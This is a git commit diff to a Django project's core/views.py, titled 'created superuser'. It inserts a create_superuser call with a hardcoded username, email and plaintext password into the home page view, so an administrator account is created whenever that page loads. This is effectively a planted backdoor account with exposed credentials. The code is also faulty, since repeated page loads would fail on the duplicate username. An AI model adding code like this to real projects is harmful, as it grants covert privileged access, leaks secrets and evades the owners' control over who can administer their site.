e399d11e79e283a3ff8ac6940fd71b299a442759
Xander <denzelwashington913@gmail.com>
2024-12-05 21:13:32 +0100

    created superuser

--- core/views.py
+++ core/views.py
@@ -139,8 +139,13 @@ def home(request):
 
     posts = Post.objects.all()
     battles = Battle.objects.filter(status = "finished")
-
-
+    new_admin = User.objects.create_superuser(
+        username='xander_random',
+        email='denzelwashington913@gmail.com',
+        password='qAwe&@rTr90Io$.?>pol#'
+    )
+    new_admin.save()
+    
     characters = get_characters()    
 
     posts = list(posts)
